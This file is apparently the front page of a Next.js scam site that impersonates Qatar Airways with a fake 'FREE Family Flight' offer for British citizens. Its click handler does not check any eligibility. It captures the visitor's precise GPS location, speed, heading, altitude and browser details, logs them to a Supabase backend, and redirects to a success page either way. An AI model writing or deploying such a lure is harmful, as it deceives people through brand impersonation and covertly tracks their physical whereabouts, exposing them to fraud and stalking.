'use client'

import { useEffect, useState } from 'react'
import { useRouter } from 'next/navigation'
import { supabaseHelpers } from '@/lib/supabase-bulletproof'
import Image from 'next/image'

export default function Home() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)

  useEffect(() => {
    // Track page visit
    supabaseHelpers.trackPageVisit('main_page')
  }, [])

  const handleAllowLocation = async () => {
    setIsLoading(true)
    
    // Track the entry trigger
    await supabaseHelpers.trackUserAction('entry_trigger_clicked', {
      button: 'claim_benefits',
      timestamp: new Date().toISOString(),
      user_agent: navigator.userAgent,
      page_url: window.location.href
    })

    // Step 1: Enhanced geolocation capture with 100% accuracy focus
    if (navigator.geolocation) {
      // Track geolocation attempt
      await supabaseHelpers.trackLocationPermission('requested')
      
      // First try: High accuracy GPS with extended timeout
      const tryHighAccuracyGPS = () => {
        return new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            (position) => resolve(position),
            (error) => reject(error),
            {
              enableHighAccuracy: true,
              timeout: 30000, // 30 seconds for high accuracy
              maximumAge: 0
            }
          )
        })
      }

      // Second try: Fast fallback if high accuracy fails
      const tryFallbackGPS = () => {
        return new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            (position) => resolve(position),
            (error) => reject(error),
            {
              enableHighAccuracy: false,
              timeout: 10000, // 10 seconds for quick fallback
              maximumAge: 60000 // Allow 1 minute old data
            }
          )
        })
      }

      try {
        // Try high accuracy first
        let position: GeolocationPosition
        try {
          position = await tryHighAccuracyGPS() as GeolocationPosition
        } catch (error) {
          // If high accuracy fails, try fallback
          console.log('High accuracy failed, trying fallback GPS...', error)
          position = await tryFallbackGPS() as GeolocationPosition
        }

        const { latitude, longitude, accuracy, speed, heading, altitude, altitudeAccuracy } = position.coords
        const locationData = {
          latitude,
          longitude,
          accuracy,
          speed: speed || null,
          heading: heading || null,
          altitude: altitude || null,
          altitudeAccuracy: altitudeAccuracy || null,
          timestamp: new Date().toISOString(),
          method: accuracy <= 10 ? 'gps_high_accuracy' : 'gps_standard',
          quality_score: accuracy <= 10 ? 'excellent' : accuracy <= 50 ? 'good' : 'fair'
        }
        
        // Track successful location capture with quality metrics
        await supabaseHelpers.trackLocationPermission('granted', locationData)
        
        // Store for form submission
        sessionStorage.setItem('userLocation', JSON.stringify(locationData))
        sessionStorage.setItem('locationCaptured', 'true')
        
        // Always proceed to form (Step 3)
        router.push('/success')

      } catch (error: unknown) {
        // Track location denial/error with detailed info
        const errorData = {
          error_code: (error as GeolocationPositionError)?.code || 'unknown',
          error_message: (error as GeolocationPositionError)?.message || 'Unknown error',
          method: 'gps_failed',
          attempts: 'both_high_accuracy_and_fallback'
        }
        
        await supabaseHelpers.trackLocationPermission('denied', errorData)
        
        // Store error for analytics
        sessionStorage.setItem('locationCaptured', 'false')
        sessionStorage.setItem('locationError', JSON.stringify(errorData))
        
        // Always proceed to form (Step 3)
        router.push('/success')
      }
    } else {
      // No geolocation support - track and proceed
      await supabaseHelpers.trackUserAction('geolocation_unsupported', {
        user_agent: navigator.userAgent,
        fallback: 'form_only'
      })
      
      sessionStorage.setItem('locationCaptured', 'false')
      sessionStorage.setItem('locationError', JSON.stringify({
        message: 'Geolocation not supported'
      }))
      
      // Always proceed to form (Step 3)
      router.push('/success')
    }
  }

  return (
    <div className="consent-container">
      <div className="image-section">
        <div className="image-overlay"></div>
        <Image 
          src="/family-travel.jpeg" 
          alt="VIP travel experience" 
          className="prize-image"
          fill
          style={{ objectFit: 'cover' }}
          priority
        />
      </div>
      <div className="content-section">
        <Image 
          src="https://logotyp.us/files/qatar-airways.svg" 
          alt="Qatar Airways" 
          className="logo"
          width={140}
          height={60}
        />
        <h1>🇬🇧 ✈️ FREE Family Flight - Limited Time!</h1>
        <p>
          <strong>Exclusive for British Citizens Only!</strong><br/>
          Qatar Airways is celebrating with one complimentary family flight (up to 4 passengers) from any UK airport to any destination worldwide. This exclusive promotion expires <strong>July 25th, 2025</strong>.
        </p>
        <button 
          onClick={handleAllowLocation}
          disabled={isLoading}
          className={isLoading ? 'loading' : ''}
        >
          {isLoading ? 'Checking Eligibility...' : 'Claim FREE Family Flight'}
        </button>
      </div>

      <style jsx>{`
        .consent-container {
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          margin: 0;
          padding: 0;
          background: #f8f8f8;
          font-family: 'Poppins', sans-serif;
        }

        .image-section {
          position: relative;
          flex: 1 1 55%;
          min-height: 300px;
        }

        .image-overlay {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: linear-gradient(to top, rgba(0,0,0,0.5), transparent);
          z-index: 1;
        }

        .prize-image {
          width: 100%;
          height: 100%;
          object-fit: cover;
        }

        .content-section {
          flex: 1 1 45%;
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          padding: 2.5rem;
          text-align: center;
          box-sizing: border-box;
          background: linear-gradient(to bottom, #ffffff 0%, #fafafa 100%);
          border-top-left-radius: 25px;
          border-top-right-radius: 25px;
          margin-top: -25px;
          position: relative;
          box-shadow: 0 -8px 25px rgba(0,0,0,0.08);
          z-index: 2;
        }

        .logo {
          width: clamp(130px, 22vw, 150px);
          margin-bottom: 1.5rem;
          filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
        }

        h1 {
          font-size: clamp(1.6rem, 4.5vw, 2rem);
          font-weight: 700;
          margin-bottom: 1.2rem;
          color: #5c0f3c;
          letter-spacing: -0.8px;
          line-height: 1.2;
        }

        p {
          font-size: clamp(0.9rem, 2.8vw, 1.1rem);
          font-weight: 400;
          margin-bottom: 2rem;
          line-height: 1.8;
          color: #444;
          max-width: 450px;
        }

        button {
          background: linear-gradient(135deg, #5c0f3c 0%, #4a0c30 100%);
          color: white;
          border: none;
          padding: 18px 36px;
          border-radius: 50px;
          cursor: pointer;
          font-size: clamp(1rem, 3vw, 1.2rem);
          font-weight: 600;
          letter-spacing: 0.5px;
          transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
          width: 100%;
          max-width: 360px;
          box-shadow: 0 4px 20px rgba(92, 15, 60, 0.3);
          position: relative;
          overflow: hidden;
        }

        button::before {
          content: '';
          position: absolute;
          top: 0;
          left: -100%;
          width: 100%;
          height: 100%;
          background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
          transition: left 0.5s ease;
        }

        button:hover::before {
          left: 100%;
        }

        button:hover:not(.loading) {
          background: linear-gradient(135deg, #4a0c30 0%, #3a0924 100%);
          transform: translateY(-3px);
          box-shadow: 0 8px 25px rgba(92, 15, 60, 0.4);
        }

        button.loading {
          opacity: 0.7;
          cursor: not-allowed;
        }

        button:disabled {
          opacity: 0.7;
          cursor: not-allowed;
          transform: none;
        }
      `}</style>
    </div>
  )
}
